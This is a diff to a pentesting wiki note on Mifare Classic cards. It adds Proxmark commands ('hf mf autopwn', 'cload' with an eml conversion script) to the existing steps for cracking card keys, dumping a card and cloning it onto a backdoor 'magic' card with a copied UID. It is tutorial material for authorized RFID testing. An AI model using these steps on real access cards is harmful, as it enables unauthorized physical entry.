@@ -1,8 +1,14 @@
-
-
-# Mifare classic 
-
-
+---
+title: Mifare Classic
+author: amandaguglieri
+draft: false
+TableOfContents: true
+tags:
+  - pentesting
+  - NFC
+  - RFID
+---
+# Mifare Classic 
 
 ## Mifare classic 
 
@@ -169,6 +175,12 @@ This dumps keys from the card into the file dumpkeys.bin. The output should be s
 [=] --[ FFFFFFFFFFFF ]-- has been inserted for unknown keys where res is 0
 ```
 
+Another way is to do an autopwn:
+
+```
+hf mf autopwn
+```
+
 
 Now to dump the contents of the card:
 
@@ -270,6 +282,29 @@ Using... hf-mf-<UID>-key.bin
 
 At this point we’ve got everything we need from the card, we can take it off the reader.
 
+Now there are two ways to proceed:
+
+### Way 1: cload
+
+Create an eml file with the previously obtained dump binary file:
+
+```
+# First go to <yourpath>/proxmark/tools/
+cd proxmark/tools/
+
+# Run the script pm3_mfd2eml.py 
+ python3 ./pm3_mfd2eml.py /home/PATH/hf-mf-<UI>-dump.bin /home/PATH/hf-mf-UID-dump.eml
+```
+
+Load the eml file into your magic card:
+
+```
+hf mf cload -f /home/PATH/hf-mf-<UID>-dump.eml
+```
+
+
+### Way 2: restore
+
 To copy that data onto a new card, place the (Chinese backdoor) card on the proxmark:
 
 ```
@@ -282,3 +317,7 @@ This restores the dumped data onto the new card. Now we just need to give the ca
 hf mf csetuid --uid <UID>
 ```
 
+
+## Resources
+
+[https://jaymonsecurity.com/seguridad-clonar-tarjeta-proxmark-red-team/](https://jaymonsecurity.com/seguridad-clonar-tarjeta-proxmark-red-team/)
